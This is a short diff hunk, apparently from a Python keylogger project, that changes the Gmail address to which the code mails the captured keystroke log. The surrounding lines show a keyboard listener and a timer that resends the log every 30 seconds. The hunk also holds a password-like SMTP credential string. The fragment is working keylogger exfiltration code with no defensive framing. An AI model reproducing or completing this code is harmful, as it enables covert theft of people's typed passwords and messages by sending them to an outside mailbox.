@@ -44,7 +44,7 @@ keylogger_listener = keyboard.Listener(on_press=callback_function)
 
 def thread_function():
     global log
-    send_email("excamplegmail001smtp@gmail.com", "nssv kpwb pkpi qhso", log.encode("utf-8"))
+    send_email("exampleemailforsmtp@gmail.com", "nssv kpwb pkpi qhso", log.encode("utf-8"))
     log = ""
     timer_object = threading.Timer(30, thread_function)
     timer_object.start()
